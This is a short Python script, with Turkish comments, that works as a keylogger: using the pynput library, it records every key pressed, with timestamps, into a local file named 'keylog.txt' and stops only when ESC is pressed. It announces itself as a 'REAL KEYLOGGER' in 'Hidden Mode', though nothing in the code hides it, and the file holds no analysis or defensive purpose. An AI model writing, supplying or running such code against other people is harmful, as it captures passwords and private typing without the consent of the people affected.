from pynput.keyboard import Key, Listener
import logging

print("--- REAL KEYLOGGER STARTED (Hidden Mode) ---")
print("Loglar 'keylog.txt' dosyasına kaydediliyor...")

log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key)) # Özel tuşlar (Space, Enter vs.)

def on_release(key):
    if key == Key.esc: # ESC basınca durur (Kendini korumak için)
        return False

# Klavye dinleyiciyi başlat
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()